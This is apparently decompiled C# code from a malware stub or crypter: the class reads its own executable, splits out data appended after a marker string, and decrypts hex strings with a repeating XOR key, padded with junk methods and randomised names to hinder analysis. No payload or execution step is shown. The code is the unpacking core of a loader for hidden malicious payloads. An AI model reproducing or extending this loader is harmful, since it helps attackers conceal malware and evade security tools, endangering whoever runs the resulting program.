using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Avgnte;

public class pi
{
	private static object licate = Process.GetCurrentProcess().MainModule!.FileName;

	internal static object[] info = Strings.Split(File.ReadAllText(Conversions.ToString(licate)), "X4EtWm6rWX", -1, (CompareMethod)0);

	public void u9wiImBjglINBD80KhQ7LUEh()
	{
	}

	public static byte[] R_(string Input, string pass)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = Input.Length - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i += 2)
			{
				string value = Conversions.ToString(Strings.Chr((int)(Conversions.ToLong("&H" + Input.Substring(i, 2)) ^ Strings.Asc(pass[num2]))));
				stringBuilder.Append(value);
				num2 = ((num2 != pass.Length - 1) ? (num2 + 1) : 0);
			}
			return Encoding.Default.GetBytes(stringBuilder.ToString());
		}
	}

	public object UB747m()
	{
		int num = 5;
		do
		{
			num = checked(num + 1);
		}
		while (num <= 36);
		return 678913355;
	}
}
